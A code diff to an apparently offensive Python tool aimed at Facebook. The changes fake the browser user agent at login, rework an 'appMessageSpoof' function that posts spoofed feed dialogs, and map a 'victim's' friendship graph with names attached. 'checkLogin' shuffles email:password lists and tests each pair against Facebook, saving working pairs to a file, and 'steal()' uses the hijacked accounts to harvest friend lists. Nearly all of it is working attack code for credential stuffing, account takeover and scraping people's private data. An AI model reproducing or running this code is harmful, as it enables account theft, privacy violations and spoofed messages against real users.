@@ -22,6 +22,7 @@ from mechanize import Request
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 import datetime
+from random import shuffle
 
 blocked = 0
 masterCj = ''
@@ -49,7 +50,9 @@ def login(email, password,state):
     # Empty the cookies
     cj.clear()
     # Access the login page to get the forms
-    driver = webdriver.Firefox()
+    profile = webdriver.FirefoxProfile()
+    profile.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36")
+    driver = webdriver.Firefox(profile)
     driver.get("https://www.facebook.com/")
     assert "Facebook" in driver.title
     elem = driver.find_element_by_name("email")
@@ -634,11 +637,11 @@ def appMessageSpoof(appId,link,picture,title,domain,description,comment):
             print 'ERROR MOTHER FUCKER -_-'
             
         arguments = {
-            'fb_dtsg' : br.form['fb_dtsg'],
+            'fb_dtsg' : fb_dtsg,
             'preview' : '0',
             '_path' : 'feed',
             'app_id' : int(appId),
-            'redirect_uri' : 'https://facebook.com',
+            'redirect_uri' : 'https://facebook.com/',
             'display' : 'page',
             'link' : str(link),
             'picture' : str(picture),
@@ -652,7 +655,7 @@ def appMessageSpoof(appId,link,picture,title,domain,description,comment):
             }
         
         datos = urlencode(arguments)
-        response = br.open('https://www.facebook.com/dialog/feed',datos)
+        response = br.open('https://www.facebook.com/v2.0/dialog/feed',datos)
         
         if globalLogging:
                 logs(response.read())
@@ -1860,20 +1863,39 @@ def simpleGraph(friends, victim):
     mkdir(directory,root)
     
     myGraph = nx.Graph()
+    myGraphLabeled = nx.Graph()
     
     coleccion[victim] = nodeID
     
     victima = nodeID
     myGraph.add_node(victima)
+
     nodeID += 1
     #Check if the file exists, if true append, else create and writes
     try:
         friendshipFile = open( os.path.join(root,directory,victim+".txt"),"ab")
     except:
         friendshipFile = open( os.path.join(root,directory,victim+".txt"),"wb")
+    try:
+        usersAndID = pickle.load(open(os.path.join('dumps',victim,victim+"UserNamesIDindexed.txt"),"rb"))
+    except:
+        print 'Something went wrong while loading the userId and usernames dictionary file! '
 
-    for friend in friends:
+    try:
+        myGraphLabeled.add_node(usersAndID[victim])
+    except:
+        myGraphLabeled.add_node(victim)
         
+    total = len(friends)
+    i = 0.0
+    print 'Getting victim\'s friends relashionship .. please wait, this is going to take a while...'
+    print 'Get a coffee or something'
+    for friend in friends:
+        #Percentage calculus 
+        percentage = (i * 100.0)/total
+        flush()
+        print '\rIterating on %d of %d - [%.2f%%] completed\r' %(i ,total, percentage), 
+        i+=1
         friendshipFile.write(str(friend)+'\n')
         
         try:
@@ -1886,17 +1908,31 @@ def simpleGraph(friends, victim):
         
         if myGraph.has_node(friend) != True:
             myGraph.add_node(friend)
-        
-            
+            try:
+                myGraphLabeled.add_node(usersAndID[friend])
+            except:
+                myGraphLabeled.add_node(friend)
+                
         if myGraph.has_edge(victima, friend) != True:
             myGraph.add_edge(victima, friend)
-
+            try:
+                myGraphLabeled.add_edge(usersAndID[victim],usersAndID[friend])
+            except:
+                myGraphLabeled.add_edge(victim,friend)
+                
         for element in mutual:
             if myGraph.has_node(element) != True:
                 myGraph.add_node(element)
                 myGraph.add_edge(element, friend)
+                try:
+                    myGraphLabeled.add_node(usersAndID[element])
+                    myGraphLabeled.add_edge(usersAndID[element],usersAndID[friend])
+                except:
+                    myGraphLabeled.add_node(element)
+                    myGraphLabeled.add_edge(element,friend)
         
     friendshipFile.close()
+    
     mkdir('objects', os.path.join(root,directory))
     
     A = nx.adj_matrix(myGraph)
@@ -1907,47 +1943,58 @@ def simpleGraph(friends, victim):
     plt.savefig( os.path.join(root,directory,victim+"graph_color.png") )
     write_dot(myGraph,os.path.join(root,directory,victim+"graph_color.dot"))  
     plt.show()
-    
+
+    nx.draw_spring(myGraphLabeled,node_color = np.linspace(0,1,len(myGraphLabeled.nodes())),edge_color = np.linspace(0,1,len(myGraphLabeled.edges())) ,with_labels=True)
+    plt.savefig( os.path.join(root,directory,victim+"graphLabeled_color.pdf") )
+    plt.savefig( os.path.join(root,directory,victim+"graphLabeled_color.png") )
+    write_dot(myGraphLabeled,os.path.join(root,directory,victim+"graphLabeled_color.dot"))  
+    plt.show()
+
+def checkMe(username):
+    if username == 'me':
+        driver = webdriver.Firefox()
+        driver.get("https://www.facebook.com/")
+        cookies = pickle.load(open("cookies.pkl", "rb"))
+        for cookie in cookies:
+            driver.add_cookie(cookie)
+        driver.get("https://m.facebook.com/me")
+        name = driver.current_url
+        name =  name.replace("https://m.facebook.com/","")
+        match = re.search("([a-zA-Z]+\.*[0-9]*)*",name)
+        if match is not None:
+            username = match.group()
+        driver.close()
+    return username
+
 def friendshipPlot(text,victim):
     friends = []
     friendsID = []
-    counter = 0
-    lastId = 0
-    count = 0
-    while counter < 4:
-        matchStart = re.search("_5q6s _8o _8t lfloat _ohe\" href=\"https://www.facebook.com/",text)
-        if matchStart is not None:
-            start = matchStart.end()
-            matchEnd = re.search("\?",text[start:])
-            name = text[start:matchEnd.start()+start]
-            if (name not in friends) and (name != "profile.php"):
-                friends.append(name)
-                fbid = getUserID(name)
-                if fbid is not -1:
-                    friendsID.append(fbid)
-                    count += 1
-                    flush()
-                    print "\rFriends enumerated: %d" %count,
-            text = text[matchEnd.start()+start:]
-        else:
-            try:
-                c_user = getC_user()
-                userId = getUserID(victim)
-                if getUserID(friends[len(friends)-1]) == lastId:
-                    counter += 1
-                lastId = getUserID(friends[len(friends)-1])
-                encoded = b64encode('0:not_structured:'+str(lastId))
-                response = br.open('https://www.facebook.com/ajax/pagelet/generic.php/AllFriendsAppCollectionPagelet?data={"collection_token":"'+userId+':2356318349:2","cursor":"'+encoded+'","tab_key":"friends","profile_id":'+userId+',"q":"'+victim+'","overview":false,"ftid":null,"order":null,"sk":"friends","importer_state":null}&__user='+c_user+'&__a=1&__dyn=7n8apij2qmp5zpQ9UoHbgWyxi9ACwKyaF299qzCAjFDxCm&__req=7&__rev=1183274')
-                to_parse = str(response.read()).strip('for (;;);')
-                try:
-                    #Converts the json web response to a python like object
-                    json_dump = json.loads(to_parse)
-                    text = json_dump["payload"]
-                except:
-                    print 'Error on json loading' 
-                
-            except:
-                print 'ERROR MOTHER FUCKER'
+    getFriends(victim)
+
+    try:
+        friendsFile = open(os.path.join('dumps',victim,victim+"UserNames.txt"),"r")
+    except:
+        print 'Something went wrong with the output file.. try again or debug :D '
+        return
+    while True:
+        linea = friendsFile.readline()
+        if not linea:
+            break
+        friends.append(linea.strip('\r\n'))
+    print 'Wait while we get the user id\'s of your victim\'s friends '
+    getUserIDS(victim)
+
+    try:
+        friendsIdFile = open(os.path.join('dumps',victim,victim+"UserIDS.txt"),"r")
+    except:
+        print 'Something went wrong with the output file.. try again or debug :D '
+        return
+    
+    while True:
+        linea = friendsIdFile.readline()
+        if not linea:
+            break
+        friendsID.append(linea.strip('\r\n'))
     return friendsID, friends
 
 def coreFriendshipPrivacy(victim,transitive):
@@ -3096,17 +3143,23 @@ def checkLogin(mailList):
         index = email.find(":")
         if index != -1:
             credenciales[email[0:index]] = email[index+1:].strip('\n')
-            
-    for emails in credenciales.keys():
-        if (login(emails,credenciales[emails],'real') != -1) or (blocked == 1):
-            verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"a")
-            verified.write(emails+':'+credenciales[emails]+'\n')
-            verified.close()
-            print emails + ' valid email and passowrd!!! MOTHER KAKERRRRR :D '
-            blocked = 0
-        else:
-            print emails + ' not valid email or password'
-    
+    credentials = credenciales.keys()
+    shuffle(credentials)
+    for emails in credentials:
+        try:
+            if (login(emails,credenciales[emails],'real') != -1) or (blocked == 1):
+                verified = open(os.path.join("PRIVATE","loggedin","Loggedin.txt"),"a")
+                verified.write(emails+':'+credenciales[emails]+'\n')
+                verified.close()
+                print emails + ' valid email and passowrd!!! MOTHER KAKERRRRR :D '
+                blocked = 0
+            else:
+                print emails + ' not valid email or password'
+        except signalCaught as e:
+            print 'Signal caught'
+            return
+        except:
+            continue
     try:
         verified.close()
     except:
@@ -3136,7 +3189,8 @@ def steal():
                 print 'Account valid, but blocked due to location issues'
             else:
                 check = checkPrivacy('me')
-                friendList, friendsName = friendshipPlot(check,'me')
+                username = checkMe("me")
+                friendList, friendsName = friendshipPlot(check,username)
                 fileThreads = open(os.path.join("massive","threads.txt"),"wb")
                 for friends in friendList:
                     fileThreads.write(friends+'\n')
@@ -3147,8 +3201,9 @@ def steal():
             print emails + ' not valid email or password'
 
 def getUserIDS(username):
+    usernameAndID = {}
     usernamesFile = open(os.path.join('dumps',username,username+"UserNames.txt"),"r")
-    userIDSFile = open(os.path.join('dumps',username,username+"UserIDS.txt"),"a").close()
+    userIDSFile = open(os.path.join('dumps',username,username+"UserIDS.txt"),"w").close()
     userIDS = []
     usernames = []
     percentage = 0.0
@@ -3168,11 +3223,12 @@ def getUserIDS(username):
         userIDS.append(userID)
         try:
             userIDSFile.write(userID+'\n')
+            usernameAndID[userID+'\n'] = user
         except:
             print 'unknown error'
         userIDSFile.close()
         i += 1
-
+    pickle.dump( usernameAndID , open(os.path.join('dumps',username,username+"UserNamesIDindexed.txt"),"wb"))
 def sendPrivateMessage(message,buddy):
     
     c_user = getC_user()
